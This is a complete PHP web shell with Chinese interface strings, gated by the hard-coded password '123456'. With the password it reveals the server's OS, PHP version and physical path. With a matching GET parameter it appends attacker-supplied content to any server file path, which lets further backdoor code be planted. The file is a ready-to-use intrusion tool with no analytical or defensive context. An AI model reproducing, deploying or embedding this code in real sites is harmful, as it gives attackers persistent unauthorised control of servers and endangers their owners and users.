<?php 
$password = isset($_POST['password']) ? $_POST['password'] : '';
$get = isset($_GET['id']) ? $_GET['id'] : '';
$pass = '123456';
if($password==$pass){
echo '操作系统内核:' .PHP_OS.'<br />';
echo '当前PHP的版本:'.PHP_VERSION.'<br />';
echo '<b style="color:red;">物理路径:'.__DIR__ .'\\</b>';echo'<br /><hr />';
?><?php echo $pass?><?php exit;}elseif(isset($get) && !empty($get)  && $get==$pass){
        $lujin = @$_POST['lujin'];
        $neirong = @$_POST['neirong'];
         if (empty($lujin) || empty($neirong)) {
        echo '请填写路径或内容';
        exit;        
        }
        $fh = @fopen($lujin,'a');
        @fwrite($fh,$neirong);
        echo '写入成功';
        echo '<hr />';
        echo '您的路径是:'.$lujin;
        exit;
}?>